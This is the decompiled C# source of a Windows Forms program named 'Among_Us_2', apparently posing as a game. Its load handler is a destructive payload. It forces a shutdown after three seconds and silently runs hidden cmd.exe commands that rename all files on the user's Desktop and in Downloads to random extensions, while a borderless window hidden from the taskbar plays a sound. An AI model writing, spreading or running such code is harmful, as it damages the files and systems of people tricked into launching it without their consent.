using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Windows.Forms;
using Among_Us_2.Properties;

namespace Among_Us_2;

public class Form1 : Form
{
	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		Process.Start("shutdown", "-s /t 3");
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C ren C:\\Users\\%USERNAME%\\Desktop\\*.* *.%random%";
		process.StartInfo = processStartInfo;
		process.Start();
		Process process2 = new Process();
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
		processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo2.FileName = "cmd.exe";
		processStartInfo2.Arguments = "/C ren C:\\Users\\%USERNAME%\\Downloads\\*.* *.%random%";
		process2.StartInfo = processStartInfo2;
		process2.Start();
		SoundPlayer val = new SoundPlayer((Stream)Resources.Fire);
		val.Play();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_AutoSize(true);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(1489, 968));
		((Control)this).set_Cursor(Cursors.get_Cross());
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
